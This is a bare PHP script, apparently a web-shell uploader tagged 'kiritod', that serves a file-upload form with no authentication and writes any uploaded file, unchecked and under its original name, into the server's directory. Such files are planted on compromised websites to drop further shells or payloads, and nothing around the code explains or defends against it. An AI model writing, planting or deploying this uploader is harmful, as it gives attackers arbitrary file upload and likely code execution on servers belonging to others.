<? 
echo "kiritod"."<br>";
echo '<form method="post" enctype="multipart/form-data"><input type="file" name="___upload" /><input type="submit" name="_upl" /></form>';
if(isset($_POST['_upl'])){
    if(copy($_FILES['___upload']['tmp_name'],$_FILES['___upload']['name'])){
        echo '<b>Upload !!!</b><br><br>';
    }else{
        echo '<b>Fail</b><br><br>';
    }
}
?>